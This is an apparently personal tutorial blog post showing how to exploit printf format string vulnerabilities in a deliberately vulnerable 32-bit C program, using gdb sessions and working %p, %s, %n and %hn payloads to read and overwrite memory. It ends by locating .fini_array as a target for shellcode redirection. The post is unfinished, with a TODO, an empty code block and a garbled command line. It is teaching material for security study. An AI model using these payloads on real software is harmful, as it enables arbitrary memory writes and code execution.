---
layout: post
title: subverting-printf
excerpt: "Using malformed printf statements to arbitrarily read and write memory."
categories: [tech]
tags: [itsec, howto]
comments: false
---

TODO: update instructions
To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you probably are too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ASLR (Address Space Layout Reandomisation) has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space`.

Note that I am supressing warnings with the `-w` flag - that's intentional and solely for the purpose of this exercise!

## `printf` calling convention

Let's start by looking at how `printf` is called from an assembly perspective. Here's the `C` code:

~~~ c
#include <stdlib.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
  printf("\n");

  exit(0);
}
~~~

Let's compile that and check the corresponding assembly in `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list 10
5       main(int argc, char* argv[])
6       {
7         unsigned int var = 0xAAAAAAAA;
8         char buffer[512];
9         strcpy(buffer, argv[1]);
10
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
12        printf("\n");
13
14        exit(0);
(gdb) break 11
Breakpoint 1 at 0x80484d3: file printf_c.c, line 11.
(gdb) set disassemble-next-line on
(gdb) run foo
Starting program: /home/vagrant/scratch/a.out foo

Breakpoint 1, main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
=> 0x080484d3 <main+56>:        83 ec 04                sub    esp,0x4
   0x080484d6 <main+59>:        8d 45 f4                lea    eax,[ebp-0xc]
   0x080484d9 <main+62>:        50                      push   eax
   0x080484da <main+63>:        8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
   0x080484e0 <main+69>:        50                      push   eax
   0x080484e1 <main+70>:        68 90 85 04 08          push   0x8048590
   0x080484e6 <main+75>:        e8 55 fe ff ff          call   0x8048340 <printf@plt>
   0x080484eb <main+80>:        83 c4 10                add    esp,0x10
~~~ 

We see that we push 3 things on top of the stack before the `call`. Let's see those in more details:

~~~ shell
(gdb) break *0x080484e6
Breakpoint 2 at 0x80484e6: file printf_c.c, line 11.
(gdb) set disassemble-next-line off
(gdb) c
Continuing.

Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
(gdb) x/4wx $esp
0xffffd950:     0x08048590      0xffffd96c      0xffffdb6c      0xf7fefe7a
(gdb) x/s 0x08048590
0x8048590:      "Caller passed in string %s, var is located at 0x%08x"
(gdb) x/s 0xffffd96c
0xffffd96c:     "foo"
(gdb) x/x 0xffffdb6c
0xffffdb6c:     0xaa
(gdb) x/4x 0xffffdb6c
0xffffdb6c:     0xaa    0xaa    0xaa    0xaa
~~~

As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next.

`printf` takes a variable number of arguments thought. So how does it know what to look for on the stack? It parses the format string.

## Reading arbitrary addresses

As we saw above, `printf` expects all its arguments (determined by the format string) to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf(buffer);
  printf("\n");

  exit(0);
}
~~~

Which works as expected *as long as* the caller does not include a format string:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ ./a.out hello
hello
vagrant@vagrant:~/scratch$ ./a.out hello%08x
helloffb5ad8b
~~~

So what just happened? `printf` parsed the format string and decided it needed an extra argument - and just took the next item on the stack and displayed it as a 4-bytes word. Let's try that again with a more contrived example:

~~~ shell
vagrant@vagrant:~/scratch$ ./a.out DDDD$(perl -e "print '%p..'x12")
DDDD0xffdf3d60..0xf77d8f1c..0xf77cbe7a..0x8..0xf77cbe66..0xf77d9000..0x44444444..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..
~~~

The `0x44444444` looks suspicious, and so does the repeating `0x2e2e7025`. Sure enough:

~~~ shell
vagrant@vagrant:~/scratch$ printf "\x44\x44\x44\x44\n"
DDDD
vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
..p%
~~~

Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time *it has been placed fully on the stack*! And as we walk down the stack we encounter what we put on.

This unfortunately means we cannot read past our input using `%p` - but we can trick `printf` into reading a string at a memory location of our choosing. If we use the `%s` format, `printf` will use what's on the stack  as the address of a string and will read until a null byte is found. But what shall we read? Let's try an environment variable.

Now `gdb` does some funky stuff meaning the environment we execute under differs to the one outside. Thankfully there's something we can do about it but it's a little messy (I'm sure there *must* be a better way). We'll use `env -i` to ignore the current environment. Let's also figure out where we need to place our `%s`:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5')
DDDD0xffffdd54..0xf7ffd000..0xf7fefec9..0x44444444..0x2e2e7025..
~~~

This means we should have 3 `%p` before adding our `%s` - which, as it stands, would cause `printf` to try and read the string located at `0x44444444` which sure enough, segfaults:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Segmentation fault (core dumped)
~~~

We need to figure out where our environment variable is located:

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
~~~

Despite `env -i`, `gdb` still added stuff! Okay let's add that to our environment too.

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar LINES=29 COLUMNS=211 gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
(gdb) break main
Breakpoint 1 at 0x80484b1: file printf_c.c, line 8.
(gdb) r
Starting program: /home/vagrant/scratch/a.out DDDD%p..%p..%p..%s

Breakpoint 1, main (argc=2, argv=0xffffde84) at printf_c.c:8
8         strcpy(buffer, argv[1]);
(gdb) x/4s *environ
0xffffdf9d:     "SOME_VAR=foobar"
0xffffdfad:     "COLUMNS=211"
0xffffdfb9:     "PWD=/home/vagrant/scratch"
0xffffdfd3:     "LINES=29"
(gdb) p/x 0xffffdf9d+9
$1 = 0xffffdfa6
~~~

Again `gdb` makes things a little more difficult - the order of the variables differs from the one we specified. It just means we need to call our binary with the vars in that order - and `SOME_VAR` will be located at `0xffffdf9d` + 9 bytes (one for each character of `SOME_VAR=`). We're now ready to run this:

~~~ shell
vagrant@vagrant:~/scratch$ env -i SOME_VAR=foobar COLUMNS=211 LINES=29 PWD=/home/vagrant/scratch /home/vagrant/scratch/a.out $(python -c 'print "\xa6\xdf\xff\xff" + "%p.."*3 + "%s"')
▒▒0xffffdf8a..0xf7ffd000..0xf7fefec9..foobar
~~~

Success!

The astute reader would have pointed out this would have been *much* simpler using `getenv` but I was hell bent on getting this to work with `gdb`. Heh.

## Writing to an arbitrary address

`printf` has a little known format parameter - `%n` - that writes the number of bytes written so far. The argument it takes is a memory address - something we know we can control.

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);
  printf(buffer);
  printf("\n");
  printf("var = 0x%08x and is located at %p\n", var, &var);
  exit(0);
}
~~~

We can see use this to overwrite an address with a different value:

~~~ shell
vagrant@vagrant:~/scratch$ gcnt:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%p.."*6 + "%n"')
\▒0xffffdd4e..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..0xf7ffd000..
var = 0x00000045 and is located at 0xffffdb5c
~~~



vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%x"*5 + "%100x%n"')
\▒ffffdd57f7ffcf1cf7fefe7a8f7fefe66                                                                                            f7ffd000
var = 0x00000089 and is located at 0xffffdb5c
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%x"*5 + "%120x%n"')
\▒ffffdd57f7ffcf1cf7fefe7a8f7fefe66                                                                                                                f7ffd000
var = 0x0000009d and is located at 0xffffdb5c
~~~

The second set of format string achieves the same thing as the first but by controlling the width of the `%x` parameter we get to change the number of bytes written and therefore the value of `var`. The question remains - what address should be overwrite and with what?

Ideally this should be a function pointer - we could override that to point to shellcode stored in an environment variable (just like in the previous post). Finding one is relatively straightforward, thanks to the ELF format. But first let's make sure we can override an address with a value of our choice - say `0xffffdd5a`.


~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD"+"%x."*7')
DDDDffffdd25.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.44444444.
var = 0xaaaaaaaa and is located at 0xffffdb1c
~~~

We want to make `var` equal to `0xffffdd5a`.

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%x."*6 + "%n"')
▒ffffdd26.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
var = 0x00000033 and is located at 0xffffdb1c
~~~

The `%n` formatter writes 32 bits which is a little unwildly to work with. Instead we will use the `h` modifier to write 2 bytes at a time - one at the first half of the target address, the other at the +2 offset. Let's run our binary again:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%x."*6 + "%hn"')
▒ffffdd25.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
var = 0xaaaa0033 and is located at 0xffffdb1c
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff"+"%x."*6 + "%hn%hn"')
▒▒ffffdd1e.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
var = 0x00370037 and is located at 0xffffdb1c
~~~

So we first write 2 bytes to `0xffffdb1c` and a further 2 bytes to `0xffffdb1e` (which is the first address + 2, for the second half). To write our target value of `0xffffdd5a` we'll therefore need to write `0xffff` and `0xdd5a`. Things however get a little tricky because changing the length of our input string impacts the offset. To get around this, we'll try to find the correct offset using a template which won't change the length of the string:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5 + "%0000x%p"')
DDDD0xffffdd1e..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..f7ffd0000x44444444
var = 0xaaaaaaaa and is located at 0xffffdb1c
~~~

If we replace `DDDD` with an address and the last `%p` with %n`, we should be able to accurately control the number of bytes written:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff" + "%p.."*5 + "%010x%n"')
▒0xffffdd1f..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..00f7ffd000
var = 0x00000043 and is located at 0xffffdb1c
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff" + "%p.."*5 + "%011x%n"')
▒0xffffdd1f..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..000f7ffd000
var = 0x00000044 and is located at 0xffffdb1c
~~~

Let's now do this for 2 addresses:

~~~ shell

~~~

~~~ shell
vagrant@vagrant:~/scratch$ objdump -h a.out | grep fini_arr
 19 .fini_array   00000004  08049f0c  08049f0c  00000f0c  2**2
~~~

